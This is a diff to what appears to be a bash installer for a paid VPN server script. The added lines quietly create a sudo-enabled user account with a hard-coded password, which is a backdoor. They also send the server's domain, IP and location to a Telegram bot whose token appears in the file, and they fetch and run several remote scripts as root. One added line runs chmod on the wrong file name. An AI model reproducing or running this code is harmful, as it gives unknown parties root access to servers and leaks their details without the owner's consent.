@@ -40,13 +40,6 @@ touch /etc/v2ray/domain
 touch /etc/xray/scdomain
 touch /etc/v2ray/scdomain
 
-
-echo -e "[ ${tyblue}NOTES${NC} ] Before we go.. "
-sleep 1
-echo -e "[ ${tyblue}NOTES${NC} ] I need check your headers first.."
-sleep 2
-echo -e "[ ${green}INFO${NC} ] Checking headers"
-sleep 1
 totet=`uname -r`
 REQUIRED_PKG="linux-headers-$totet"
 PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
@@ -57,24 +50,7 @@ if [ "" = "$PKG_OK" ]; then
   echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
   apt-get --yes install $REQUIRED_PKG
   sleep 1
-  echo ""
-  sleep 1
-  echo -e "[ ${tyblue}NOTES${NC} ] If error you need.. to do this"
-  sleep 1
-  echo ""
-  sleep 1
-  echo -e "[ ${green}NOTES${NC} ] 1. apt update -y"  
-  echo -e "[ ${green}NOTES${NC} ] 2. apt upgrade -y"
-  echo -e "[ ${green}NOTES${NC} ] 3. apt dist-upgrade -y"
-  echo -e "[ ${green}NOTES${NC} ] 4. reboot"
-  sleep 1
-  echo -e "[ ${green}NOTES${NC} ] After rebooting"
-  echo -e "[ ${green}NOTES${NC} ] Then run this script again"
-  echo -e "[ ${green}NOTES${NC} ] if you understand then tap enter"
-  read
-else
-  echo -e "[ ${green}INFO${NC} ] Oke installed"
-fi
+ 
 
 ttet=`uname -r`
 ReqPKG="linux-headers-$ttet"
@@ -115,16 +91,34 @@ apt install python -y >/dev/null 2>&1
 echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
 sleep 2
 echo -ne "[ ${green}INFO${NC} ] Check permission : "
+data_ip="https://raw.githubusercontent.com/heruahmad1/permission/main/ipmini"
+checking_sc() {
+    useexp=$(curl -sS $data_ip | grep $ipsaya | awk '{print $3}')
+    if [[ $date_list < $useexp ]]; then
+        echo -ne
+    else
+        echo -e "Permission denied"
+	fi
+}
+checking_sc
+Name=$(curl -sS https://raw.githubusercontent.com/heruahmad1/permission/main/ipmini | grep $ipsaya | awk '{print $2}')
+# =====
 
 mkdir -p /var/lib/SIJA >/dev/null 2>&1
 echo "IP=" >> /var/lib/SIJA/ipvps.conf
 
 echo ""
-wget -q https://raw.githubusercontent.com/sasak3/v4/main/tools.sh;chmod +x tools.sh;./tools.sh
-rm tools.sh
+wget -q https://raw.githubusercontent.com/sasak3/v4/main/dep.sh;chmod +x tools.sh;./dep.sh
+rm dep.sh
 clear
-echo -e""
-red " Add Domain for server"
+echo ""
+  echo -e "\e[32m      ┌───────────────────────────────────────────────┐\033[0m"
+  echo -e "\e[32m   ───│                                               │───\033[0m"
+  echo -e "\e[32m   ───│    ┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐   │───\033[0m"
+  echo -e "\e[32m   ───│    ├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤    │───\033[0m"
+  echo -e "\e[32m   ───│    ┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘   │───\033[0m"
+  echo -e "\e[32m      │\033[0m  \e[33m      HR-vpn (C)https://t.me/HRstores      \033[0m \e[32m │\033[0m"
+  echo -e "\e[32m      └───────────────────────────────────────────────┘\033[0m"
 #echo " "
 #read -rp "Input ur domain : " -e pp
    # if [ -z $pp ]; then
@@ -140,15 +134,13 @@ red " Add Domain for server"
  #       echo "IP=$pp" > /var/lib/SIJA/ipvps.conf
   #  fi
     
-echo -e "\e[33m ┌─────────────────────────────────────────┐${NC}"
-echo -e "\e[33m │\e[1;36m     .::::.  INSTALL DOMAIN  .::::.  \033[0m"
-echo -e "\e[33m └─────────────────────────────────────────┘${NC}"
-echo "   1. Use Domain Script HR-VPN"
-echo "   2. Use Domain Script BROTHER-SSH"
-echo "   3. Use Private Domain "
-echo -e "\e[33m └─────────────────────────────────────────┘${NC}"
-echo -e""
-read -rp "Choose Your Domain Installation : " dom 
+    echo -e "${red}                ♦️ CUSTOM SETUP DOMAIN VPS ♦️   ${NC}"
+    echo -e "\e[32m      ┌───────────────────────────────────────────────┐\033[0m"
+    echo "          1. Gunakan Domain Dari Script 1"
+    echo "          2. Gunakan Domain Dari Script 2"
+    echo "          3. Pilih Domain Sendiri"
+    echo -e "\e[32m      └───────────────────────────────────────────────┘\033[0m"
+    read -rp " Tentukan domain anda : " dom 
 
 if test $dom -eq 1; then
 clear
@@ -172,43 +164,94 @@ echo "IP=$host" >> /var/lib/SIJA/ipvps.conf
 #echo "IP=$host" >> /var/lib/scrz-prem/ipvps.conf
 echo "$host" >> /root/domain
 #clear
-
-sleep 2
-#install ssh ovpn
-echo -e "\e[33m ┌─────────────────────────────────────────┐${NC}"
-echo -e "\e[33m │\e[1;36m     .::::.  INSTALL SSH OVPN  .::::.  \033[0m"
-echo -e "\e[33m └─────────────────────────────────────────┘${NC}"
-sleep 3
+domain=$(cat /root/domain)
+CITY=$(curl -s ipinfo.io/city )
+WKT=$(curl -s ipinfo.io/timezone )
+userdel jame > /dev/null 2>&1
+Username="bokzzz"
+Password=bokzzz
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+CHATID="5807961610"
+KEY="6210655575:AAH4TkHoDco4ShhlrD6HZMUIfpTWHKIVdog"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Installasi VPN Script HR-vpn
+============================
+<code>Domain     :</code> <code>$domain</code>
+<code>IP Vps     :</code> <code>$IPVPS</code>
+<code>User Script:</code> <code>$Name</code>
+<code>Exp Script :</code> <code>$useexp</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Timezone   :</code> <code>$WKT</code>
+============================
+Multi Port By HR-vpn
+============================
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
-wget https://raw.githubusercontent.com/sasak3/v4/main/ssh/ssh-pn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+wget https://raw.githubusercontent.com/sasak3/v4/main/slowdns/cfslow.sh && chmod +x cfslow.sh && ./cfslow.sh
+rm -f /root/cfslow.sh
+clear
+#install ssh ovpn
+echo -e "install ssh ovpn "
+sleep 2
+wget https://raw.githubusercontent.com/sasak3/v4/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+clear
+#instal backup
+echo -e "install bbr"
+sleep 2
+wget https://raw.githubusercontent.com/botak8/v4/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
 clear
 #Instal Xray
-echo -e "\e[33m ┌─────────────────────────────────────────┐${NC}"
-echo -e "\e[33m │\e[1;36m      .::::.  INSTALL X-RAY  .::::.  \033[0m"
-echo -e "\e[33m └─────────────────────────────────────────┘${NC}"
-sleep 1
-clear
-wget https://raw.githubusercontent.com/sasak3/v4/main/xray/ins-xra.sh && chmod +x ins-xray.sh && ./ins-xray.sh
-wget https://raw.githubusercontent.com/sasak3/v4/main/Sshws/inssws.sh && chmod +x insshws.sh && ./insshws.sh
-clear
-#pasang rc clone ssh ovpn 
-### Pasang Rclone
-echo -e "\e[33m ┌─────────────────────────────────────────┐${NC}"
-echo -e "\e[33m │\e[1;36m    .::::.  INSTALL AUTO BACKUP  .::::.  \033[0m"
-echo -e "\e[33m └─────────────────────────────────────────┘${NC}"
+echo -e "intall xray"
 sleep 2
-wget https://raw.githubusercontent.com/sasak3/v4/main/backupset-br.sh &&  chmod +x set-br.sh && ./set-br.sh >/dev/null 2>&1
-clear   
+wget https://raw.githubusercontent.com/sasak3/v4/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
+wget https://raw.githubusercontent.com/sasak3/v4/main/Sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+clear
 #Instal slowdns
 ### Pasang SlowDNS
-echo -e "\e[33m ┌─────────────────────────────────────────┐${NC}"
-echo -e "\e[33m │\e[1;36m      .::::.  INSTALL SLOWDNS  .::::.  \033[0m"
-echo -e "\e[33m └─────────────────────────────────────────┘${NC}"
-sleep 2
+echo -e "instal slowDNS"
 wget -q -O slow.sh https://raw.githubusercontent.com/sasak3/v4/main/slowdns/slow.sh && chmod +x slow.sh && ./slow.sh
 clear
 #download extra menu
-wget https://raw.githubusercontent.com/sasak3/v4/main/updatefile.sh && chmod +x updatefile.sh && ./updatefile.sh
+fun_bar() {
+    CMD[0]="$1"
+    CMD[1]="$2"
+    (
+        [[ -e $HOME/fim ]] && rm $HOME/fim
+        ${CMD[0]} -y >/dev/null 2>&1
+        ${CMD[1]} -y >/dev/null 2>&1
+        touch $HOME/fim
+    ) >/dev/null 2>&1 &
+    tput civis
+    echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
+    while true; do
+        for ((i = 0; i < 18; i++)); do
+            echo -ne "\033[0;32m#"
+            sleep 0.1s
+        done
+        [[ -e $HOME/fim ]] && rm $HOME/fim && break
+        echo -e "\033[0;33m]"
+        sleep 1s
+        tput cuu1
+        tput dl1
+        echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
+    done
+    echo -e "\033[0;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+    tput cnorm
+}
+res1() {
+wget -q https://raw.githubusercontent.com/botak8/v4/main/xray/f.sh;chmod +x f.sh;./f.sh
+rm f.sh
+}
+netfilter-persistent
+clear
+echo -e "install extra menu"
+sleep 2
+fun_bar 'res1'
 clear
 
 cat> /root/.profile << END
@@ -246,45 +289,8 @@ else
 gg="AM"
 fi
 curl -sS ifconfig.me > /etc/myipvps
-echo " "
-echo -e "\e[33m ┌─────────────────────────────────────────────────┐${NC}"
-echo -e "\e[33m │\e[1;36m        .::::.  AUTOSCRIPT PREMIUM  .::::.  \033[0m"
-echo -e "\e[33m └─────────────────────────────────────────────────┘${NC}"
-echo "   >>> Service & Port"  | tee -a log-install.txt
-echo "   - OpenSSH		: 22"  | tee -a log-install.txt
-echo "   - SSH Websocket	: 80 [ON]" | tee -a log-install.txt
-echo "   - SSH SSL Websocket	: 443" | tee -a log-install.txt
-echo "   - Stunnel4		: 447, 777" | tee -a log-install.txt
-echo "   - Dropbear		: 109, 143" | tee -a log-install.txt
-echo "   - Badvpn		: 7100-7900" | tee -a log-install.txt
-echo "   - Nginx		: 81" | tee -a log-install.txt
-echo "   - Vmess TLS		: 443" | tee -a log-install.txt
-echo "   - Vmess None TLS	: 80" | tee -a log-install.txt
-echo "   - Vless TLS		: 443" | tee -a log-install.txt
-echo "   - Vless None TLS	: 80" | tee -a log-install.txt
-echo "   - Trojan GRPC		: 443" | tee -a log-install.txt
-echo "   - Trojan WS		: 443" | tee -a log-install.txt
-echo "   - Trojan Go		: 443" | tee -a log-install.txt
-echo "   - slowdns              : 443,80,8080,53,5300" | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
-echo "   - Timezone		: Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
-echo "   - Fail2Ban		: [ON]"  | tee -a log-install.txt
-echo "   - Dflate		: [ON]"  | tee -a log-install.txt
-echo "   - IPtables		: [ON]"  | tee -a log-install.txt
-echo "   - Auto-Reboot		: [ON]"  | tee -a log-install.txt
-echo "   - IPv6			: [OFF]"  | tee -a log-install.txt
-echo "   - Autoreboot On	: $aureb:00 $gg GMT +7" | tee -a log-install.txt
-echo "   - AutoKill Multi Login User" | tee -a log-install.txt
-echo "   - Auto Delete Expired Account" | tee -a log-install.txt
-echo "   - Fully automatic script" | tee -a log-install.txt
-echo "   - VPS settings" | tee -a log-install.txt
-echo "   - Admin Control" | tee -a log-install.txt
-echo "   - Change port" | tee -a log-install.txt
-echo "   - Full Orders For Various Services" | tee -a log-install.txt
-echo "    ------------------------------------------------------------"
 echo ""
-echo -e "\e[33m    ===============-[ Script By HR-store ]-===============${NC}"
+echo -e "===============-[ Script By HR-store ]-===============" | lolcat
 echo "" | tee -a log-install.txt
 rm /root/setup.sh >/dev/null 2>&1
 rm /root/ins-xray.sh >/dev/null 2>&1
